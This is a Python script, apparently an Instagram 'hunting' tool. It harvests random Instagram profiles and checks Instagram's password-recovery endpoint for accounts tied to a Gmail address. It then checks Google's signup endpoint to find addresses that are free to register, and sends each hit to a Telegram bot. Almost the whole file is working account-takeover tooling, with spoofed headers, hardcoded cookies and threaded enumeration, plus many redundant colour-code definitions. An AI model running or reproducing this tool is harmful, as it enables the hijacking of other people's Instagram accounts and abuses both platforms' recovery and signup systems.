
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Timer
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import webbrowser
init(autoreset=True)
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'tl.txt'
eizon_domain = '@gmail.com'


E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
#— — — — — — — — — — — — —
W1 = '\x1b[1;97m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'
G = '\033[1;34m'
HH = '\033[1;34m'
O = '\x1b[38;5;208m'; Y = '\033[1;34m'; C = '\033[2;35c'; M = '\x1b[1;37m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
gg = '\x1b[38;5;208m'
X = '\033[1;33m' #اصفر
J22='\x1b[38;5;209m'
J21='\x1b[38;5;204m'
J2='\x1b[38;5;203m'
J1='\x1b[38;5;202m'
nnn = random.choice([a1,a2,a3,a4,a5,a14,a18,a20,a21,a22,a23,a26,a27,a37,a38,a40])
print(nnn)
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

eizon_header = render('matrx', colors=['white', 'red'], align='center')
Orange_3 = "\033[38;5;271m"
Yellow_2 = "\033[38;5;272m"
Turquoise_2 = "\033[38;5;273m"
Medium_Aquamarine_2 = "\033[38;5;274m"
Dark_Khaki_3 = "\033[38;5;275m"
Light_Pink_3 = "\033[38;5;276m"
Goldenrod_2 = "\033[38;5;277m"
Royal_Blue_3 = "\033[38;5;278m"
SeaGreen_2 = "\033[38;5;279m"
Medium_Green_2 = "\033[38;5;280m"
Blue_4 = "\033[38;5;281m"
Dark_SeaGreen_3 = "\033[38;5;282m"
Purple_3 = "\033[38;5;283m"
Orange_5 = "\033[38;5;284m"
Pale_Green_2 = "\033[38;5;285m"
Plum_3 = "\033[38;5;286m"
Dark_Violet_2 = "\033[38;5;287m"
Medium_Turquoise_4 = "\033[38;5;288m"
Lavender_4 = "\033[38;5;289m"
Dark_Turquoise = "\033[38;5;290m"
Pale_Violet_Red_3 = "\033[38;5;291m"
Medium_SeaGreen_4 = "\033[38;5;292m"
Light_SkyBlue_3 = "\033[38;5;293m"
Dark_Goldenrod_4 = "\033[38;5;294m"
Firebrick_2 = "\033[38;5;295m"
Royal_Green_2 = "\033[38;5;296m"
Medium_Purple_4 = "\033[38;5;297m"
Light_Goldenrod = "\033[38;5;298m"
Slate_Gray_3 = "\033[38;5;299m"
Dark_SeaGreen_4 = "\033[38;5;300m"
Green_Lime_2 = "\033[38;5;301m"
Dark_Pink_2 = "\033[38;5;302m"
Lavender_2 = "\033[38;5;303m"
Medium_Purple_5 = "\033[38;5;328m"
Slate_Blue_5 = "\033[38;5;329m"
Dark_Turquoise_2 = "\033[38;5;330m"
Light_Pink_5 = "\033[38;5;331m"
Aqua_4 = "\033[38;5;332m"
Medium_Violet_Red_5 = "\033[38;5;333m"
Forest_Green_6 = "\033[38;5;334m"
Violet_2 = "\033[38;5;335m"
Steel_Blue_3 = "\033[38;5;336m"
Orange_6 = "\033[38;5;337m"
Slate_Gray_6 = "\033[38;5;338m"
Pale_Turquoise_2 = "\033[38;5;339m"
Lavender_5 = "\033[38;5;340m"
Light_Green_2 = "\033[38;5;341m"
Yellow_4 = "\033[38;5;342m"
Turquoise_4 = "\033[38;5;343m"
Indigo_2 = "\033[38;5;344m"
Medium_Rose = "\033[38;5;345m"
Light_Lime_2 = "\033[38;5;346m"
Pastel_Orange = "\033[38;5;347m"
SeaGreen_5 = "\033[38;5;348m"
Dark_Goldenrod_5 = "\033[38;5;349m"
Deep_Sky_Blue_4 = "\033[38;5;350m"
Light_SeaGreen_4 = "\033[38;5;351m"
Royal_Orange = "\033[38;5;352m"
Yellow_Green_4 = "\033[38;5;353m"
Turquoise_5 = "\033[38;5;354m"
Lavender_6 = "\033[38;5;355m"
Medium_Purple_6 = "\033[38;5;356m"
Light_Blue_3 = "\033[38;5;357m"
Dark_Pink_3 = "\033[38;5;358m"
Orange_7 = "\033[38;5;359m"
Forest_Green_7 = "\033[38;5;360m"
Medium_Turquoise_6 = "\033[38;5;361m"
Pale_Green_3 = "\033[38;5;362m"
Lavender_Blush_3 = "\033[38;5;363m"
Slate_Gray_7 = "\033[38;5;364m"
Pale_Turquoise_3 = "\033[38;5;365m"
Peach_2 = "\033[38;5;366m"
Medium_SeaGreen_5 = "\033[38;5;367m"
Light_Turquoise = "\033[38;5;368m"
Yellow_5 = "\033[38;5;369m"
Spring_Green_2 = "\033[38;5;370m"
Dark_Purple_2 = "\033[38;5;371m"
SeaGreen_6 = "\033[38;5;372m"
Dark_SlateBlue_2 = "\033[38;5;373m"
Purple_4 = "\033[38;5;374m"
Light_Goldenrod_2 = "\033[38;5;375m"
Coral_2 = "\033[38;5;376m"
Blue_Violet_3 = "\033[38;5;377m"
Lavender_7 = "\033[38;5;378m"
Aquamarine_5 = "\033[38;5;379m"
Slate_Gray_8 = "\033[38;5;380m"
Light_Coral_2 = "\033[38;5;381m"
Medium_Green_3 = "\033[38;5;382m"
Lime_3 = "\033[38;5;383m"
Fuchsia_3 = "\033[38;5;384m"
Deep_Pink_4 = "\033[38;5;385m"
Royal_Blue_4 = "\033[38;5;386m"
Purple_5 = "\033[38;5;387m"
Goldenrod_3 = "\033[38;5;388m"
SlateBlue_3 = "\033[38;5;389m"
SeaGreen_7 = "\033[38;5;390m"
Light_SeaGreen_5 = "\033[38;5;391m"
Medium_Turquoise_7 = "\033[38;5;392m"
Medium_Rose_2 = "\033[38;5;393m"
Dark_Goldenrod_6 = "\033[38;5;394m"
Violet_3 = "\033[38;5;395m"
Dark_Violet_3 = "\033[38;5;396m"
Forest_Green_8 = "\033[38;5;397m"
Indigo_3 = "\033[38;5;398m"
Peach_3 = "\033[38;5;399m"
Turquoise_6 = "\033[38;5;400m"
Pale_Violet_Red_2 = "\033[38;5;401m"
Light_Coral_3 = "\033[38;5;402m"
Purple_6 = "\033[38;5;403m"
Spring_Green_3 = "\033[38;5;404m"
Medium_SeaGreen_6 = "\033[38;5;405m"
Light_Turquoise_2 = "\033[38;5;406m"
Medium_Green_4 = "\033[38;5;407m"
Deep_Sky_Blue_5 = "\033[38;5;408m"
Lime_4 = "\033[38;5;409m"
Slate_Gray_9 = "\033[38;5;410m"
Aqua_Marine_2 = "\033[38;5;411m"
Light_Violet_3 = "\033[38;5;412m"
Lavender_8 = "\033[38;5;413m"
Light_Green_3 = "\033[38;5;414m"
Dark_SlateBlue_3 = "\033[38;5;415m"
Blue_5 = "\033[38;5;416m"
Orange_8 = "\033[38;5;417m"
Violet_4 = "\033[38;5;418m"
Medium_Aquamarine_3 = "\033[38;5;419m"
Royal_Blue_5 = "\033[38;5;420m"
Pink_4 = "\033[38;5;421m"
Light_SeaGreen_6 = "\033[38;5;422m"
Goldenrod_4 = "\033[38;5;423m"
Medium_Turquoise_8 = "\033[38;5;424m"
Peach_4 = "\033[38;5;425m"
Lavender_9 = "\033[38;5;426m"
Light_Yellow_3 = "\033[38;5;427m"
Coral_3 = "\033[38;5;428m"
Spring_Green_4 = "\033[38;5;429m"
Forest_Green_9 = "\033[38;5;430m"
SlateBlue_4 = "\033[38;5;431m"
Medium_Violet_Red_6 = "\033[38;5;432m"
SeaGreen_8 = "\033[38;5;433m"
Slate_Gray_10 = "\033[38;5;434m"
Aqua_Blue_2 = "\033[38;5;435m"
Light_Blue_4 = "\033[38;5;436m"
Aquamarine_6 = "\033[38;5;437m"
Blue_6 = "\033[38;5;438m"
Medium_Purple_7 = "\033[38;5;439m"
Slate_Gray_11 = "\033[38;5;440m"
Pale_Turquoise_4 = "\033[38;5;441m"
Lime_5 = "\033[38;5;442m"
Pale_Green_4 = "\033[38;5;443m"
Deep_Pink_5 = "\033[38;5;444m"
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
X = '\033[1;33m' #اصفر
J22='\x1b[38;5;209m'
J21='\x1b[38;5;204m'
J2='\x1b[38;5;203m'
J1='\x1b[38;5;202m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
B='\x1b[1;37m'
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m' ;  E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
B='\x1b[1;37m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
gg = '\x1b[38;5;208m'
X = '\033[1;33m' #اصفر
J22='\x1b[38;5;209m'
J21='\x1b[38;5;204m'
J2='\x1b[38;5;203m'
J1='\x1b[38;5;202m'
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'


def clear():
            sd= choice([J1,J2,J21,J22,F1,C1,P1,P2])
            sd2= choice([J1,J2,J21,J22,F1,C1,P1,P2])
nnn = random.choice([a1,a2,a3,a4,a5,a14,a18,a20,a21,a22,a23,a26,a27,a37,a38,a40])
print(nnn)
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m' ; 
ge,be,gt,bt=0,0,0,0
eila = (f"""   ملاحظة:لو وقفت الاداه شغل VPN
   """)
print(eila)
ID = input('\x1b[1;32m'' ENTAR Id: ')
TOKEN = input('\x1b[1;32m'+' ENTAR Tokin: ')
tlg = '''<b>𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳
     شيء تُؤْجَر عليه❤️
  القناة للفائده:@huntinsta
  حساب المطور:@b8k_8
𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳</b>'''
url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
data = {
    'chat_id': ID,
    'video': 'https://t.me/zzzxx/198954',
    'caption': tlg,
    'parse_mode': 'HTML'
}
response = requests.post(url, data)
os.system('cls'if os.name=='net'else'clear')
print(eila)
def pppp():
    ge = hits
    bt = bad_insta + bad_email
    be = good_ig
    sys.stdout.write(f"\r       {F}True{F}- {ge} {gg}× {X}False{F}- {Z}{be} {gg}× {Z}Not{F}- {A}{bt}")
    sys.stdout.flush()
def update_stats():
    pppp()


def Eizon():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        Eizon()

Eizon()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + eizon_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass

def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        USER_AGENT_HEADER: ua,
        COOKIE_HEADER: COOKIE_VALUE,
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
    }
    data = {
        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                      json.dumps({
                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                          'adid': uui,
                          'guid': uui,
                          'device_id': device_id,
                          'query': email
                      })),
        IG_SIG_KEY_VERSION: '4'
    }
    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
    if email in response:
        if eizon_domain in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                          '"device_id":"android-b93ddb37e983481c",'
                          '"query":"' + user + '"}'),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
        eizonporno = response.get('email', 'Reset None')
    except:
        eizonporno = 'Reset None'
    return eizonporno

def date(hy):
    try:
        ranges = [
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count')
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    total_hits += 1
    info_text = f"""  
═══════════════
☀️ Number - {total_hits} 
☀️ Gmail - {username}@{domain} 
☀️ Reset - {rest(username)} 
☀️ Username - {username} 
☀️ Followers - {followers} 
☀️ folloing - {following} 
☀️ https://www.instagram.com/{username}
 TLE:@huntinsta القناة للفائده
           @b8k_8 حساب المطور
═══════════════
"""
    fg = f'''

   ═══════════════
☀️ Number - {total_hits} 
☀️ Gmail - {username}@{domain} 
☀️ Reset - {rest(username)} 
☀️ Username - {username} 
☀️ Followers - {followers} 
TLE:@huntinsta القناة للفائدة
         @b8k_8حساب المطور
═══════════════
    '''
    print(fg)
    with open('sofe.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception:
        pass

def eizon_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(1629010000, 2500000000)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:

                followers = account.get('follower_count', 0)
                if followers < 5: # باقر. :)"
                    continue
                infoinsta[username] = account
                emails = [username + eizon_domain]
                for email in emails:
                    check(email)
        except Exception:
            pass


def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

Thread(target=stats_loop, daemon=True).start()


for _ in range(15):
    Thread(target=eizon_python).start()
    #لاتلعب بالسكربت